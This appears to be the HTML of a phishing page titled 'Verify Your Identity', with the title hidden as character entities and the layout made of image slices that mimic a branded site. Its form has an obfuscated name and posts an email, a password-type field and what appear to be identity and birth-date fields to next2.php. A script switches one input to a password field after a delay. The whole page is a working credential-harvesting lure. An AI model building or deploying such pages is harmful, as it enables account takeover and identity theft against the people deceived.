<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
  
.textbox {  
    border: solid 1px #ccc; 
  	padding-left: 8px;
	font-family: "Open Sans","Arial",sans-serif;
  	font-size: 14px;
    height: 28px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border: 1px solid #1C4094;
	box-shadow: 0px 0px 1px #1C4094; 	
    outline: 0; 
 } 

 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image2" style="position:absolute; overflow:hidden; left:223px; top:120px; width:499px; height:75px; z-index:0"><img src="images/f8.png" alt="" title="" border=0 width=499 height=75></div>

<div id="image3" style="position:absolute; overflow:hidden; left:240px; top:236px; width:160px; height:197px; z-index:1"><img src="images/f1.png" alt="" title="" border=0 width=160 height=197></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:82px; z-index:2"><a href="#"><img src="images/w1.png" alt="" title="" border=0 width=1349 height=82></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:235px; top:457px; width:860px; height:12px; z-index:19"><img src="images/h2.png" alt="" title="" border=0 width=860 height=12></div>

<div id="image6" style="position:absolute; overflow:hidden; left:138px; top:637px; width:944px; height:216px; z-index:20"><img src="images/w11.png" alt="" title="" border=0 width=944 height=216></div>

<div id="image6" style="position:absolute; overflow:hidden; left:900px; top:497px; width:68px; height:29px; z-index:3"><a href="#"><img src="images/f3.png" alt="" title="" border=0 width=68 height=29></a></div>

<form action=next2.php name=sdhfskdjfhsdkjfhsf345983475!!!!!! id=sdhfskdjfhsdkjfhsf345983475!!!!!! method=post>
<input name="eml" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:352px;left:243px;top:258px;z-index:4">
<input name="sn" placeholder="" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:352px;left:243px;top:339px;z-index:5">
<input name="db" placeholder="" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:352px;left:243px;top:417px;z-index:6">

<div id="formimage1" style="position:absolute; left:980px; top:497px; z-index:7"><input type="image" name="formimage1" width="94" height="29" src="images/btn1.png"></div>

</div>

</body>
</html>
